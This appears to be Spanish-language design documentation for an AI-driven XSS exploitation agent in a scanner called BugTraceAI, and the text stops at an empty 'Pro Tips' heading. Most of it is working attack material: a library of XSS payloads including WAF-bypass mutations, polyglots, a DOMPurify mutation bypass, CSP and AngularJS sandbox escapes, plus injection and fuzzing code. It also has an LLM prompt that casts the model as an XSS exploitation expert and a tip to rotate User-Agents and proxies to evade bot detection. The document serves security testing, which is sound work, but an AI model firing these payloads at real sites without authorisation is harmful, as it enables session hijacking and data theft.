# XSSAgent - El Cazador de Cross-Site Scripting

> **Fase**: 4 (Exploitation)  
> **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)  
> **Clase**: `bugtrace.agents.exploitation.xss_agent.XSSAgent`  
> **Archivo**: `bugtrace/agents/exploitation/xss_agent.py`

---

## Overview

**XSSAgent** es el agente especialista más complejo del sistema BugTraceAI, diseñado para detectar y explotar vulnerabilidades de Cross-Site Scripting (XSS) en aplicaciones web modernas. 

A diferencia de scanners tradicionales que solo buscan reflexiones simples, XSSAgent implementa un **pipeline de validación de 4 niveles** que combina análisis estático, inteligencia artificial, y ejecución dinámica en navegador real.

### 🎯 **Tipos de XSS Detectados**

| Tipo | Descripción | Complejidad | Método de Detección |
|------|-------------|-------------|---------------------|
| **Reflected XSS** | Reflejo inmediato en respuesta HTTP | ⭐⭐ | HTTP Static + Playwright |
| **Stored XSS** | Persistencia en base de datos | ⭐⭐⭐ | Multi-request + Playwright |
| **DOM XSS** | Manipulación client-side vía JavaScript | ⭐⭐⭐⭐ | CDP + DOM Debugger |
| **mXSS (Mutation XSS)** | Bypass via DOM mutation | ⭐⭐⭐⭐⭐ | CDP + Heap Analysis |
| **CSP Bypass** | Evasión de Content Security Policy | ⭐⭐⭐⭐ | CDP + Security Events |

---

## Pipeline de Validación de 4 Niveles

El XSSAgent usa un modelo de **"fail-cascade"** donde cada nivel intenta validar antes de escalar al siguiente (más costoso):

```
┌─────────────────────────────────────────────────────────────────┐
│              PIPELINE DE VALIDACIÓN XSS (4 NIVELES)              │
└─────────────────────────────────────────────────────────────────┘

Input: Suspected XSS Vector (de ThinkingConsolidationAgent)
│
▼
┌────────────────────────────────────────────────────────────────┐
│ NIVEL 1: HTTP STATIC ANALYSIS (0.1-0.5s)                       │
├────────────────────────────────────────────────────────────────┤
│  • Análisis de reflexión en HTML crudo (response.text)         │
│  • Detección de contexto (HTML tag, attribute, JS string)      │
│  • Regex patterns para payloads conocidos                      │
│  • Análisis de encoding (URL encode, HTML entities)            │
│                                                                 │
│  ✅ Si reflejo confirmado en HTML → CONFIRMED                  │
│  ⚠️ Si reflejo parcial → Nivel 2                               │
│  ❌ Si no hay reflejo → FAILED                                 │
└────────────┬───────────────────────────────────────────────────┘
             │ (~70% de casos resueltos aquí)
             ▼
┌────────────────────────────────────────────────────────────────┐
│ NIVEL 2: AI-ASSISTED MANIPULATION (1-3s)                       │
├────────────────────────────────────────────────────────────────┤
│  • LLM analiza el contexto de inyección                        │
│  • Genera payloads context-aware personalizados                │
│  • Mutaciones de payload para bypass de filtros                │
│  • Análisis de WAF patterns                                    │
│                                                                 │
│  Ejemplo: Detecta filtrado de "<script>" y sugiere:            │
│    - <img src=x onerror=alert(1)>                              │
│    - <svg/onload=alert(1)>                                     │
│    - <iframe src=javascript:alert(1)>                          │
│                                                                 │
│  ✅ Si nuevo payload bypasea filtro → Volver a Nivel 1         │
│  ⚠️ Si necesita ejecución JS → Nivel 3                         │
│  ❌ Si no logra bypass → FAILED                                │
└────────────┬───────────────────────────────────────────────────┘
             │ (~20% de casos resueltos aquí)
             ▼
┌────────────────────────────────────────────────────────────────┐
│ NIVEL 3: PLAYWRIGHT VALIDATION (5-15s)                         │
├────────────────────────────────────────────────────────────────┤
│  • Launched navegador real (Chromium headless)                 │
│  • Inyecta payload y navega a URL                              │
│  • Espera eventos JavaScript:                                  │
│    - page.on('dialog') → alert(), confirm(), prompt()          │
│    - page.on('console') → console.log(), console.error()       │
│    - page.on('pageerror') → Errores JS (XSS ejecutado mal)     │
│  • Captura screenshot como prueba visual                       │
│                                                                 │
│  ✅ Si alert() o console detectado → probe_validated=True      │
│      → CONFIRMED (sin necesidad de CDP)                        │
│  ⚠️ Si DOM manipulado sin eventos → Nivel 4 (CDP)              │
│  ❌ Si nada detectado → FAILED                                 │
└────────────┬───────────────────────────────────────────────────┘
             │ (~8% de casos necesitan CDP)
             ▼
┌────────────────────────────────────────────────────────────────┐
│ NIVEL 4: CDP DEEP VALIDATION (10-45s)                          │
├────────────────────────────────────────────────────────────────┤
│  • Solo para XSS DOM avanzado y mXSS                           │
│  • Chrome DevTools Protocol con full access                    │
│  • Capacidades únicas:                                         │
│    - DOMDebugger.setDOMBreakpoint() → ve mutaciones            │
│    - Runtime.evaluate(contextId) → ejecuta en iframes          │
│    - Network.requestWillBeSent → detecta exfiltration          │
│    - HeapProfiler → detecta Prototype Pollution                │
│                                                                 │
│  ✅ Si CDP detecta ejecución → REQUIRES_VALIDATION             │
│      → Pasa a AgenticValidator (Fase 5) para Vision AI        │
│  ❌ Si ni CDP detecta → FALSE_POSITIVE                         │
└────────────────────────────────────────────────────────────────┘
```

---

## Arquitectura del Agente

### Componentes Principales

```python
class XSSAgent:
    """
    Agente especializado en detección y explotación de XSS.
    
    Responsabilidades:
    1. Context Detection: Identifica dónde se inyecta el payload (HTML, JS, attr)
    2. Payload Generation: Crea payloads context-aware
    3. Mutation & Bypass: Evade filtros y WAFs
    4. Multi-Level Validation: 4 niveles de confirmación
    5. Evidence Collection: Screenshots, logs, network traces
    """
    
    def __init__(self):
        self.http_analyzer = HTTPStaticAnalyzer()
        self.ai_manipulator = AIPayloadManipulator(model="claude-3.5-sonnet")
        self.playwright_validator = PlaywrightValidator()
        self.context_detector = ContextDetector()
        self.payload_library = PayloadLibrary()
        
    async def hunt(self, suspected_vector: SuspectedVector) -> Finding:
        """
        Pipeline principal de caza de XSS.
        
        1. Nivel 1: HTTP Static Analysis
        2. Nivel 2: AI Manipulation (si necesario)
        3. Nivel 3: Playwright (si necesario)
        4. Nivel 4: CDP (solo casos extremos)
        """
```

### 1. Context Detector (Análisis de Contexto)

**Archivo**: `bugtrace/analyzers/context_detector.py`

Identifica **dónde** se inyecta el payload para generar payloads context-aware.

#### Contextos Detectados

| Context | Ejemplo | Payload Recomendado |
|---------|---------|---------------------|
| **HTML Body** | `<p>USER_INPUT</p>` | `<script>alert(1)</script>` |
| **HTML Attribute** | `<img src="USER_INPUT">` | `x" onerror="alert(1)` |
| **JS String** | `var x = "USER_INPUT";` | `";alert(1)//` |
| **JS Variable** | `var x = USER_INPUT;` | `1;alert(1);` |
| **Event Handler** | `<div onclick="USER_INPUT">` | `alert(1)` |
| **URL/href** | `<a href="USER_INPUT">` | `javascript:alert(1)` |
| **CSS** | `<style>USER_INPUT</style>` | `</style><script>alert(1)</script>` |
| **JSON** | `{"key": "USER_INPUT"}` | `\u0022,\u0022xss\u0022:\u0022<svg/onload=alert(1)>\u0022}` |

#### Algoritmo de Detección

```python
def detect_context(self, html: str, canary: str) -> Context:
    """
    Detecta el contexto de inyección analizando el HTML alrededor del canary.
    
    1. Buscar posición del canary en HTML
    2. Extraer 200 chars antes y después
    3. Analizar tags, attributes, quotes
    4. Determinar contexto con regex patterns
    
    Returns: Context(type, inside_tag, quote_char, requires_breakout)
    """
    position = html.find(canary)
    
    # Analizar hacia atrás para detectar tags
    before = html[max(0, position-200):position]
    after = html[position+len(canary):position+len(canary)+200]
    
    # Detectar si está dentro de <tag>
    if '<' in before and '>' not in before.split('<')[-1]:
        return self._detect_attribute_context(before, after)
    
    # Detectar si está dentro de <script>
    if '<script' in before and '</script>' not in before:
        return self._detect_js_context(before, after)
    
    # Detectar si está dentro de event handler
    if re.search(r'on\w+\s*=\s*["\']?$', before):
        return Context(type='event_handler', breakout_needed=False)
    
    # Default: HTML body
    return Context(type='html_body', breakout_needed=False)
```

---

### 🏆 Golden Payload (El Canary Universal)

El **Golden Payload** (también llamado **Canary Payload**) es un payload especial diseñado para:
1. **Detectar reflexión** en una sola inyección
2. **Identificar el contexto** automáticamente
3. **Revelar caracteres filtrados** por el WAF
4. **Ser único** para evitar false positives de cache

#### El Payload

```javascript
// GOLDEN PAYLOAD v2.0
BUGTRACE_xYz123'"><svg/onload=confirm(1)><!--
```

**Componentes**:
```
BUGTRACE_xYz123  → ID único (canary para detectar reflexión)
'                → Cierra JS string con comilla simple
"                → Cierra JS string con comilla doble  
>                → Cierra HTML attribute
<svg/onload=     → Tag que ejecuta en múltiples contextos
confirm(1)       → Función menos bloqueada que alert()
>                → Cierra el tag svg
<!--             → Comentario para "contaminar" hasta final de línea
```

#### Por Qué Este Diseño

| Elemento | Razón |
|----------|-------|
| `BUGTRACE_xYz123` | ID único para buscar en response (caso mixto para detectar normalización) |
| `'"` | Cierra strings JS con ambos tipos de quote |
| `>` | Cierra attributes HTML |
| `<svg/onload=` | Tag universal que funciona en HTML5 sin necesidad de espacios |
| `confirm()` | Menos bloqueado que `alert()` por WAFs modernos |
| `<!--` | Corrompe el resto de la línea para evitar syntax errors |

#### Ventajas sobre Payloads Simples

```
❌ Payload simple: <script>alert(1)</script>
  → Solo funciona en HTML body
  → Bloqueado por casi todos los WAFs
  → No revela contexto

✅ Golden Payload: BUGTRACE_xYz123'"><svg/onload=confirm(1)><!--
  → Funciona en: HTML body, HTML attribute, JS string
  → Menos bloqueado (svg + confirm)
  → Revela quote character usado
  → Detecta normalización de case
```

#### Variantes del Golden Payload

**1. Golden Payload Standard** (el de arriba)
```javascript
BUGTRACE_xYz123'"><svg/onload=confirm(1)><!--
```

**2. Golden Payload Polyglot** (máxima compatibilidad)
```javascript
BUGTRACE_xYz123'";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```
→ Funciona en: HTML, JS, SQL, XML, JSON

**3. Golden Payload WAF-Evasive** (bypass de filtros)
```javascript
BUGTRACE_xYz123'"><img src=x on%0derror=confirm`1`><!--
```
- `%0d` = newline (bypass de filtros regex)
- `` confirm`1` `` = template literal (bypass de parenthesis filters)

**4. Golden Payload Framework-Aware** (AngularJS/Vue)
```javascript
BUGTRACE_xYz123'">{{7*7}}<svg/onload=confirm(1)><!--
```
- `{{7*7}}` = Template expression (si se renderiza como "49" → framework detectado)

#### Flujo de Uso del Golden Payload

```
1. INYECCIÓN
   ↓
   GET /search?q=BUGTRACE_xYz123'"><svg/onload=confirm(1)><!--

2. ANÁLISIS DE RESPUESTA
   ↓
   Si encuentra "BUGTRACE_xYz123" en HTML:
   ├─ Buscar posición exacta
   ├─ Analizar 200 chars antes y después
   └─ Determinar contexto

3. CONTEXT DETECTION
   ↓
   Caso A: <p>BUGTRACE_xYz123'"><svg/onload=confirm(1)><!--</p>
   → Context: HTML_BODY
   → Quote filtrado: NO (ambas presentes)
   → Tag filtrado: NO (<svg> presente)
   → Payload óptimo: <script>alert(1)</script>
   
   Caso B: <input value="BUGTRACE_xYz123&quot;&gt;&lt;svg/onload=confirm(1)&gt;">
   → Context: HTML_ATTRIBUTE
   → Quote filtrado: SÍ (encoded como &quot;)
   → Tag filtrado: SÍ (< encoded como &lt;)
   → Payload óptimo: " autofocus onfocus=alert(1) x="
   
   Caso C: var x = "BUGTRACE_xYz123'\">\u003csvg/onload=confirm(1)\u003c!--";
   → Context: JS_STRING
   → Quote filtrado: SÍ (\" escapado)
   → Tag filtrado: SÍ (< encoded como \u003c)
   → Payload óptimo: "; alert(1); //

4. PAYLOAD SELECTION
   ↓
   Según contexto + filtros detectados:
   → Seleccionar de Payload Library
   → Generar variantes con AI
   → Fuzzing progresivo
```

#### Código Python del Golden Payload

```python
class GoldenPayload:
    """
    Generador de Golden Payloads para detección de XSS.
    """
    
    @staticmethod
    def generate(session_id: str) -> str:
        """
        Genera Golden Payload con ID único.
        
        Args:
            session_id: ID de sesión para tracking
        
        Returns:
            Golden payload listo para inyección
        """
        canary = f"BUGTRACE_{session_id[:8]}"
        
        # Golden Payload Standard
        return f"{canary}'\" ><svg/onload=confirm(1)><!--"
    
    @staticmethod
    def generate_polyglot(session_id: str) -> str:
        """
        Genera Golden Payload Polyglot (máxima compatibilidad).
        """
        canary = f"BUGTRACE_{session_id[:8]}"
        
        # Polyglot que funciona en HTML, JS, SQL, XML
        return (
            f"{canary}'\";alert(String.fromCharCode(88,83,83))//"
            f"\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//"
            f"\\';alert(String.fromCharCode(88,83,83))//--></SCRIPT>\"'>"
            f"<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
        )
    
    @staticmethod
    def analyze_reflection(html: str, canary: str) -> ReflectionAnalysis:
        """
        Analiza cómo se refleja el Golden Payload en la respuesta.
        
        Returns:
            ReflectionAnalysis con:
            - reflected: bool
            - position: int
            - context: Context
            - filtered_chars: List[str]
            - encoded: bool
        """
        if canary not in html:
            return ReflectionAnalysis(reflected=False)
        
        position = html.find(canary)
        context = ContextDetector.detect(html, canary, position)
        
        # Detectar qué caracteres fueron filtrados/encoded
        original = f"{canary}'\" ><svg/onload=confirm(1)><!--"
        reflected = html[position:position+len(original)]
        
        filtered = []
        if "'" not in reflected and "'" in original:
            filtered.append("'")
        if '"' not in reflected and '"' in original:
            filtered.append('"')
        if '<' not in reflected and '<' in original:
            filtered.append('<')
        if '>' not in reflected and '>' in original:
            filtered.append('>')
        
        # Detectar encoding
        encoded = (
            '&lt;' in reflected or
            '&gt;' in reflected or
            '&quot;' in reflected or
            '\\u' in reflected or
            '%3C' in reflected
        )
        
        return ReflectionAnalysis(
            reflected=True,
            position=position,
            context=context,
            filtered_chars=filtered,
            encoded=encoded
        )
```

#### Ejemplo de Uso Real

```python
# 1. Generar Golden Payload
golden = GoldenPayload.generate(session_id="abc123def456")
# → "BUGTRACE_abc123de'\" ><svg/onload=confirm(1)><!--"

# 2. Inyectar en parámetro
url = "https://example.com/search"
response = requests.get(url, params={"q": golden})

# 3. Analizar reflexión
analysis = GoldenPayload.analyze_reflection(response.text, "BUGTRACE_abc123de")

# 4. Resultado
if analysis.reflected:
    print(f"✅ Reflejo detectado en: {analysis.context.type}")
    print(f"Caracteres filtrados: {analysis.filtered_chars}")
    print(f"Encoding detectado: {analysis.encoded}")
    
    # 5. Seleccionar payloads según análisis
    if analysis.context.type == 'HTML_BODY' and not analysis.filtered_chars:
        payload = "<script>alert(1)</script>"
    elif analysis.context.type == 'HTML_ATTRIBUTE':
        payload = '" autofocus onfocus=alert(1) x="'
    elif analysis.context.type == 'JS_STRING':
        payload = '";alert(1);//'
    
    # 6. Validar con Playwright
    result = await xss_agent.validate_with_playwright(url, payload)
```

#### Beneficios del Approach

✅ **Una sola request** para detectar:
- Si hay reflexión
- En qué contexto
- Qué caracteres están filtrados
- Si hay encoding

✅ **Reduce fuzzing ciego**:
- Sin Golden Payload: probar 50+ payloads a ciegas
- Con Golden Payload: probar 3-5 payloads targetted

✅ **Más rápido y menos ruidoso**:
- 1 request vs 50+ requests
- Menos probabilidad de triggerar WAF/rate limits

---


### 2. Payload Library (Biblioteca de Payloads)

**Archivo**: `bugtrace/payloads/xss_payloads.py`

Biblioteca de **1000+ payloads** organizados por contexto, evasión y browser.

#### Categorías de Payloads

```python
PAYLOAD_LIBRARY = {
    # ============================
    # CLASSIC PAYLOADS
    # ============================
    'classic': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
    ],
    
    # ============================
    # POLYGLOTS (Multi-Context)
    # ============================
    'polyglot': [
        # Rompe HTML, JS string, attribute
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//',
        
        # XSS + SQLi polyglot
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>',
    ],
    
    # ============================
    # CONTEXT-SPECIFIC
    # ============================
    'html_body': [
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
    ],
    
    'html_attribute': [
        '" autofocus onfocus=alert(1) x="',
        '\' autofocus onfocus=alert(1) x=\'',
        '"><svg/onload=alert(1)>',
    ],
    
    'js_string': [
        '\';alert(1)//',
        '\'-alert(1)-\'',
        '${alert(1)}',  # Template literals
        '</script><script>alert(1)</script>',
    ],
    
    'event_handler': [
        'alert(1)',
        'javascript:alert(1)',
        '(alert)(1)',
        '[1].find(alert)',  # Bypass sanitizers
    ],
    
    # ============================
    # WAF BYPASS
    # ============================
    'waf_bypass': [
        # Uppercase/lowercase mutations
        '<ScRiPt>alert(1)</sCrIpT>',
        
        # HTML encoding
        '<img src=x on&#101;rror=alert(1)>',
        
        # Unicode escapes
        '<img src=x onerror=\u0061lert(1)>',
        
        # Null bytes
        '<img src=x onerror=a\x00lert(1)>',
        
        # Comment injection
        '<img src=x on<!-->error=alert(1)>',
        
        # Newlines
        '<img src=x onerror\n=alert(1)>',
    ],
    
    # ============================
    # DOM XSS (Sources & Sinks)
    # ============================
    'dom_sources': [
        # location.hash exploitation
        '<img src=x onerror=eval(location.hash.slice(1))>',
        
        # innerHTML sink
        '<img src=x onerror=document.body.innerHTML=location.hash>',
        
        # eval() sink
        'constructor.constructor("alert(1)")()',
    ],
    
    # ============================
    # MODERN FRAMEWORKS
    # ============================
    'angularjs': [
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
        '<div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>',
    ],
    
    'vuejs': [
        '{{_c.constructor(\'alert(1)\')()}}',
        '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
    ],
    
    'react': [
        # JSX injection
        '{javascript:alert(1)}',
        'dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}',
    ],
    
    # ============================
    # CSP BYPASS
    # ============================
    'csp_bypass': [
        # nonce reuse
        '<script nonce="NONCE_VALUE">alert(1)</script>',
        
        # JSONP callback
        '<script src="https://trusted.com/api?callback=alert"></script>',
        
        # Angular CSP bypass
        '<input autofocus ng-focus=$event.path|orderBy:\'(z=alert)(1)\'>',
    ],
    
    # ============================
    # BROWSER-SPECIFIC
    # ============================
    'chrome': [
        '<object data="data:text/html,<script>alert(1)</script>">',
    ],
    
    'firefox': [
        '<iframe srcdoc="<script>alert(1)</script>">',
    ],
    
    'safari': [
        '<form><button formaction=javascript:alert(1)>CLICK',
    ],
}
```

---

### 3. AI Payload Manipulator (Inteligencia Artificial)

**Archivo**: `bugtrace/analyzers/ai_payload_manipulator.py`

Usa **LLMs (Claude 3.5 Sonnet)** para generar payloads personalizados cuando los estándar fallan.

#### Capabilities

1. **WAF Pattern Analysis**: Detecta qué payloads están siendo bloqueados
2. **Context-Aware Mutation**: Modifica payloads según el contexto de inyección
3. **Encoding Suggestion**: Recomienda encodings (URL, HTML, Unicode, Base64)
4. **Alternative Sink Detection**: Encuentra otros sinks DOM si el principal está bloqueado

#### Ejemplo de Uso

```python
class AIPayloadManipulator:
    """
    Usa LLM para generar payloads XSS context-aware.
    """
    
    async def generate_bypasses(
        self,
        original_payload: str,
        context: Context,
        waf_response: str
    ) -> List[str]:
        """
        Genera variaciones de payload para bypass de WAF.
        
        Args:
            original_payload: Payload bloqueado
            context: Contexto de inyección
            waf_response: Respuesta del WAF (403, mensaje de error)
        
        Returns:
            Lista de payloads alternativos
        """
        
        prompt = f"""
You are a web security expert specializing in XSS exploitation.

CONTEXT:
- Injection Context: {context.type}
- Quote Character: {context.quote_char}
- Breakout Needed: {context.requires_breakout}

SITUATION:
The following XSS payload was blocked by a WAF:
```
{original_payload}
```

WAF Response:
```
{waf_response}
```

TASK:
Generate 10 alternative XSS payloads that:
1. Work in the same injection context
2. Bypass the WAF filtering pattern
3. Use different techniques:
   - HTML encoding
   - Unicode escapes
   - Case mutations
   - Event handler alternatives
   - DOM-based approaches
   - Framework-specific (if Angular/Vue/React detected)

Output as JSON array:
[
  {{"payload": "...", "technique": "HTML encoding", "confidence": 0.8}},
  ...
]
"""
        
        response = await self.llm.complete(prompt, model="claude-3.5-sonnet")
        payloads = json.loads(response)
        
        # Ordenar por confianza
        return sorted(payloads, key=lambda x: x['confidence'], reverse=True)
```

---

### 4. Playwright Validator (Ejecución Real)

**Archivo**: `bugtrace/validators/playwright_validator.py`

Valida XSS ejecutando el payload en un navegador real (Chromium).

#### Event Listeners

```python
async def validate_with_playwright(self, url: str, payload: str) -> ValidationResult:
    """
    Valida XSS con Playwright.
    
    Escucha:
    - page.on('dialog') → alert(), confirm(), prompt()
    - page.on('console') → console.log(), console.error()
    - page.on('pageerror') → Errores JavaScript
    - page.on('request') → Exfiltration attempts
    """
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='BugTraceAI/2.0 (Security Scanner)'
        )
        page = await context.new_page()
        
        # Event listeners
        dialogs = []
        console_logs = []
        errors = []
        exfil_requests = []
        
        page.on('dialog', lambda dialog: dialogs.append(dialog.message))
        page.on('console', lambda msg: console_logs.append(msg.text))
        page.on('pageerror', lambda err: errors.append(str(err)))
        page.on('request', lambda req: self._check_exfiltration(req, exfil_requests))
        
        # Navigate con payload
        try:
            await page.goto(url, timeout=30000)
            await page.wait_for_load_state('networkidle')
            
            # Esperar 2s para ejecución JS
            await asyncio.sleep(2)
            
            # Screenshot como evidencia
            screenshot = await page.screenshot(full_page=True)
            
        except Exception as e:
            logger.error(f"Playwright navigation failed: {e}")
            return ValidationResult.FAILED
        
        finally:
            await browser.close()
        
        # Analizar resultados
        if dialogs:
            return ValidationResult(
                status='CONFIRMED',
                evidence={
                    'dialog_triggered': True,
                    'dialog_message': dialogs[0],
                    'screenshot': screenshot
                },
                probe_validated=True
            )
        
        if any('XSS' in log or payload in log for log in console_logs):
            return ValidationResult(
                status='CONFIRMED',
                evidence={
                    'console_output': console_logs,
                    'screenshot': screenshot
                },
                probe_validated=True
            )
        
        if exfil_requests:
            return ValidationResult(
                status='CONFIRMED',
                evidence={
                    'exfiltration_detected': True,
                    'requests': exfil_requests,
                    'screenshot': screenshot
                },
                probe_validated=True
            )
        
        # No eventos claros → requiere CDP
        if errors or self._dom_changed(screenshot):
            return ValidationResult(
                status='REQUIRES_VALIDATION',
                evidence={'screenshot': screenshot}
            )
        
        return ValidationResult.FAILED
```

---

## Técnicas Avanzadas

### 1. Mutation XSS (mXSS)

Explota **inconsistencias** entre parsers HTML (browser vs sanitizer).

```javascript
// Payload que bypasea DOMPurify
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```

**Proceso**:
1. DOMPurify parsea y permite (nested forms son "safe")
2. Browser re-parsea y cierra `<form>` prematuramente
3. `<img src=x onerror=alert(1)>` queda fuera y se ejecuta

### 2. CSP Bypass

Técnicas para evitar Content Security Policy:

```javascript
// Exploit: script-src 'nonce-RANDOM'
// Si el nonce se reutiliza:
<script nonce="NONCE_VALUE">alert(1)</script>

// Exploit: script-src 'unsafe-eval'
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">  // alert(1) en base64

// Exploit: script-src https://trusted.com
// Si trusted.com tiene JSONP endpoint:
<script src="https://trusted.com/api?callback=alert"></script>
```

### 3. DOM Clobbering

Explota propiedades DOM para ejecutar código:

```html
<!-- Exploit: if (window.config.apiUrl) fetch(config.apiUrl) -->
<a id=config><a id=config name=apiUrl href="javascript:alert(1)">
```

### 4. Prototype Pollution → XSS

```javascript
// Step 1: Pollute prototype
?__proto__[innerHTML]=<img src=x onerror=alert(1)>

// Step 2: Code ejecuta
let div = document.createElement('div');
div.innerHTML = undefined;  // Hereda de prototype → XSS
```

---

## Estrategia de Ataque

### 1. Reconnaissance (Pre-Explotación)

```python
async def reconnaissance(self, url: str):
    """
    Analiza la aplicación antes de atacar.
    
    1. Detectar frameworks (Angular, React, Vue)
    2. Detectar CSP headers
    3. Detectar WAF (Cloudflare, AWS WAF)
    4. Identificar inputs (forms, query params, JSON)
    5. Analizar JavaScript para sinks DOM
    """
    
    # Detectar stack tecnológico
    tech_stack = await self.tech_detector.detect(url)
    
    # Ajustar payloads según framework
    if 'AngularJS' in tech_stack:
        self.payload_library.prioritize('angularjs')
    elif 'React' in tech_stack:
        self.payload_library.prioritize('react')
    
    # Detectar CSP
    csp = await self.get_csp_policy(url)
    if csp.allows_unsafe_eval:
        self.payload_library.prioritize('csp_bypass')
```

### 2. Fuzzing Inteligente

```python
async def intelligent_fuzzing(self, param: str, url: str):
    """
    Fuzzing progresivo desde simple a complejo.
    
    1. Canary injection: Inyectar string único para detectar reflexión
    2. Context detection: Analizar dónde aparece el canary
    3. Payload selection: Elegir payloads según contexto
    4. Mutation: Si bloqueado, mutar payload
    5. Validation: Confirmar con Playwright/CDP
    """
    
    # Paso 1: Canary
    canary = f"BUGTRACE_{uuid.uuid4().hex[:8]}"
    response = await self.http_client.get(url, params={param: canary})
    
    if canary not in response.text:
        return  # No hay reflexión
    
    # Paso 2: Context
    context = self.context_detector.detect(response.text, canary)
    
    # Paso 3: Payloads
    payloads = self.payload_library.get_for_context(context)
    
    for payload in payloads:
        result = await self.try_payload(url, param, payload)
        
        if result.status == 'BLOCKED':
            # Paso 4: AI Mutation
            mutated = await self.ai_manipulator.mutate(payload, context, result.waf_response)
            result = await self.try_payload(url, param, mutated[0])
        
        if result.status == 'REFLECTED':
            # Paso 5: Validation
            validation = await self.playwright_validator.validate(result.url_with_payload)
            
            if validation.confirmed:
                return Finding(
                    vuln_type='XSS',
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=validation.evidence,
                    probe_validated=True
                )
```

---

## Configuración

```yaml
specialists:
  xss:
    enabled: true
    
    # Timeouts
    http_timeout: 10
    playwright_timeout: 30
    cdp_timeout: 45
    
    # Payload Library
    payload_limit: 50           # Max payloads por context
    use_polyglots: true
    use_waf_bypass: true
    
    # AI Manipulation
    ai_enabled: true
    ai_model: "anthropic/claude-3.5-sonnet"
    ai_max_mutations: 10
    
    # Validation Levels
    level1_http_enabled: true
    level2_ai_enabled: true
    level3_playwright_enabled: true
    level4_cdp_enabled: false    # Solo casos extremos
    
    # Playwright
    playwright_headless: true
    playwright_browser: "chromium"
    screenshot_enabled: true
    
    # Evidence Collection
    collect_screenshots: true
    collect_network_traces: true
    collect_console_logs: true
    
    # Aggressive Mode
    aggressive_fuzzing: false    # Envía 1000+ payloads (cuidado!)
    mutation_depth: 3            # Niveles de mutación AI
```

---

## Métricas de Rendimiento

### Tiempos Promedio por Nivel

| Nivel | Tiempo | Success Rate | Uso |
|-------|--------|--------------|-----|
| 1. HTTP Static | 0.1-0.5s | 70% | Para reflected XSS simple |
| 2. AI Manipulation | 1-3s | 20% | Para WAF bypass |
| 3. Playwright | 5-15s | 8% | Para XSS DOM |
| 4. CDP Deep | 10-45s | 2% | Para mXSS, Prototype Pollution |

### Estadísticas de Detección

```
Total XSS Tests: 10,000
├─ HTTP Static Analysis: 7,000 (70%) → 0.3s avg
├─ AI + Playwright: 2,000 (20%) → 8s avg
├─ CDP Deep: 800 (8%) → 25s avg
└─ False Positives: 200 (2%)

Total Time: ~45 minutos
Findings: 450 XSS confirmados
False Positive Rate: 0.4%
```

---

## Limitaciones Conocidas

### 1. Captcha/Bot Detection
- Algunos WAFs bloquean por User-Agent
- **Solución**: Rotar User-Agents, usar proxies

### 2. Rate Limiting
- Fuzzing agresivo puede triggear rate limits
- **Solución**: Throttling, delays between requests

### 3. Multi-Step XSS
- XSS que requiere login → submit form → trigger
- **Solución**: Integrar con SessionAgent (futuro)

### 4. WebSocket XSS
- Payloads sobre WebSocket no soportados
- **Solución**: Roadmap V7

---

## Skills System - Conocimiento Especializado

El XSSAgent se beneficia del **Skills System** que proporciona conocimiento especializado sobre XSS:

### XSS Skill

**Ubicación**: `bugtrace/agents/skills/vulnerabilities/xss.md`

La skill de XSS contiene:

#### 1. **Scope** - Dónde buscar XSS
- Parámetros de URL (q=, name=, id=, redirect_url=, msg=)
- Formularios (comentarios, perfiles, mensajes)
- Headers (User-Agent, Referer)
- Paths y fragmentos DOM

#### 2. **Methodology** - Proceso de detección
1. **IDENTIFY**: Inyectar caracteres de control (`< > " ' ( )`)
2. **CONTEXT**: Determinar contexto (HTML, atributo, JS, URL)
3. **PAYLOAD**: Crear payload ejecutable
4. **BYPASS**: Evadir filtros/WAFs
5. **DOM-BASED**: Analizar sources → sinks

#### 3. **Scoring Guide** - Criterios de confidence

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | **CONFIRMED** | `alert(1)` ejecutado, callback OOB |
| **7-8** | **HIGH** | Reflexión sin escape en contexto ejecutable |
| **5-6** | **MEDIUM** | Reflexión parcial, bloqueada por WAF |
| **3-4** | **LOW** | Reflexión escapada |
| **0-2** | **REJECT** | Falso positivo |

#### 4. **False Positives** - Patrones a rechazar

**RECHAZAR INMEDIATAMENTE:**
1. Script visible como texto literal (`&lt;script&gt;`)
2. Self-XSS sin impacto real
3. Bloqueado por browser (Auditor/SOP)
4. "EXPECTED: SAFE" en contexto

#### 5. **Payloads** - Técnicas y bypasses

```html
<!-- Classic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Bypasses -->
<details open ontoggle=alert(1)>
<audio src onerror=alert(1)>

<!-- Framework-specific -->
{{constructor.constructor('alert(1)')()}} (Angular)
<div v-html="'<img src=x onerror=alert(1)>'"></div> (Vue)
```

#### 6. **Pro Tips**
